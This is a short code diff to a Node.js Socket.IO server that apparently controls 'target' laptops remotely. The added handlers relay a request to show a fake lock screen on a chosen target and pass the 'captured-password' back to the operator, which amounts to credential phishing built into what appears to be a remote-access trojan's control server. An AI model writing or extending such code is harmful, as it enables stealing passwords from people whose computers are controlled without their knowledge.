@@ -248,6 +248,14 @@ io.on('connection', (socket) => {
     io.to(targetId).emit('force-stop-all');
   });
 
+  socket.on('request-fake-lockscreen', (targetId) => {
+    io.to(targetId).emit('request-fake-lockscreen', socket.id);
+  });
+
+  socket.on('captured-password', (data) => {
+    io.to(data.targetId).emit('captured-password', data.password);
+  });
+
   socket.on('disconnect', () => {
     if (clients[socket.id]) {
       console.log('Target Laptop Disconnected:', clients[socket.id].name);
